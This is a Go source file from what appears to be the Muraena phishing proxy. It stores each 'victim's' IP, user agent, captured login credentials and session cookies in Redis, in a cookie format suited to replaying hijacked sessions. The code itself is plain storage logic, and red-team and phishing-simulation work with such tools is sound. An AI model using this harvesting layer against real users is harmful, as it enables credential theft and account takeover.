package db

import (
	"fmt"

	"github.com/gomodule/redigo/redis"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

// Victim: a browser that interacts with Muraena
// KEY scheme:
// victim:<ID>
type Victim struct {
	ID                  string `redis:"id"`
	IP                  string `redis:"ip"`
	UA                  string `redis:"ua"`
	FirstSeen           string `redis:"fseen"`
	LastSeen            string `redis:"lseen"`
	RequestCount        int    `redis:"reqCount"`
	CredsCount          int    `redis:"creds_count"`
	CookieJar           string `redis:"cookiejar_id"`
	SessionInstrumented bool   `redis:"session_instrumented"`

	Credentials []VictimCredential
}

// VictimCredential: a victim has at least one set of credentials
// KEY scheme:
// victim:<ID>:creds:<COUNT>
type VictimCredential struct {
	Key   string `redis:"key"`
	Value string `redis:"val"`
	Time  string `redis:"time"`
}

// VictimCookie: a victim has N cookies associated with its web session
// KEY scheme:
// victim:<ID>:cookiejar:<COOKIE_NAME>
type VictimCookie struct {
	Name     string `redis:"name" json:"name"`
	Value    string `redis:"value" json:"value"`
	Domain   string `redis:"domain" json:"domain"`
	Expires  string `redis:"expires" json:"expirationDate"`
	Path     string `redis:"path" json:"path"`
	HTTPOnly bool   `redis:"httpOnly" json:"httpOnly"`
	Secure   bool   `redis:"secure" json:"secure"`
	SameSite string `redis:"sameSite" json:"sameSite"`
	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
}

// Store saves a Victim in the database
func (v *Victim) Store() error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", v.ID)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(v)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim not saved.", err)
		return err
	}

	// push the Victim.ID
	_, err := rc.Do("RPUSH", "victims", v.ID)
	if err != nil {
		return err
	}

	return nil
}

// Store saves a VictimCredential in the database
func (vc *VictimCredential) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	v, err := GetVictim(victimID)
	if err != nil {
		return err
	}

	// store the credentials
	key := fmt.Sprintf("victim:%s:creds:%d", victimID, v.CredsCount)
	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	// increase the credentials count
	// TODO implement this with REDIS HINCRBY
	key = fmt.Sprintf("victim:%s", victimID)
	increment := make(map[string]string)
	increment["creds_count"] = fmt.Sprintf("%d", v.CredsCount+1)

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim creds not saved.", err)
		return err
	}

	return nil
}

// Store saves a Cookie in the database
func (vc *VictimCookie) Store(victimID string) error {

	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s:cookiejar:%s", victimID, vc.Name)

	jarEntry, err := redis.Values(rc.Do("HGETALL", key))
	if err != nil {
		log.Warning("warning: %s", err)
	}

	var vCookie VictimCookie
	err = redis.ScanStruct(jarEntry, &vCookie)
	if err != nil {
		log.Warning("warning on scan struct: %s", err)
	}

	// check if the cookie is already stored.
	// if it is, just updates its values but do not add an entry to the cookie names list
	if vCookie.Name == "" {
		// store the cookie name onlt if not present already
		_, err = rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", victimID), vc.Name)
		if err != nil {
			return err
		}
	}

	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(vc)...); err != nil {
		log.Error("error doing redis HMSET: %s. victim cookie not saved.", err)
		return err
	}

	return nil
}

// GetVictim returns a Victim from database
func GetVictim(victimID string) (*Victim, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	var v Victim
	vid := fmt.Sprintf("victim:%s", victimID)
	value, err := redis.Values(rc.Do("HGETALL", vid))
	if err != nil {
		return nil, err
	}

	err = redis.ScanStruct(value, &v)
	if err != nil {
		return nil, err
	}

	return &v, nil
}

// GetVictimCreds returns a VictimCredential from database
func (v *Victim) GetCredentials(index int) (*VictimCredential, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	var vc VictimCredential
	vcID := fmt.Sprintf("victim:%s:creds:%d", v.ID, index)
	value, err := redis.Values(rc.Do("HGETALL", vcID))
	if err != nil {
		return nil, err
	}

	err = redis.ScanStruct(value, &vc)
	if err != nil {
		return nil, err
	}

	return &vc, nil
}

// GetVictimCookiejar returns a slice of VictimCookie associated to a victim
func GetVictimCookiejar(victimID string) ([]VictimCookie, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	values, err := redis.Strings(rc.Do("LRANGE", fmt.Sprintf("victim:%s:cookiejar_entries", victimID), "0", "-1"))
	if err != nil {
		return nil, err
	}

	// log.Debug("Victim %s has %d cookies in the cookiejar", victimID, len(values))

	var cookiejar []VictimCookie
	for _, name := range values {
		var cookie VictimCookie
		value, err := redis.Values(rc.Do("HGETALL", fmt.Sprintf("victim:%s:cookiejar:%s", victimID, name)))
		if err != nil {
			return nil, err
		}

		err = redis.ScanStruct(value, &cookie)
		if err != nil {
			return nil, err
		}

		cookiejar = append(cookiejar, cookie)
	}

	return cookiejar, nil
}

// GetAllVictims returns all the victim IDs stored in the database
func GetAllVictims() ([]string, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()

	values, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
	if err != nil {
		return nil, err
	}

	return values, nil
}

func SetSessionAsInstrumented(victimID string) error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	key := fmt.Sprintf("victim:%s", victimID)
	if _, err := rc.Do("HSET", key, "session_instrumented", true); err != nil {
		log.Error("error doing redis HSET: %s. session_instrumented field not saved.", err)
		return err
	}

	return nil
}
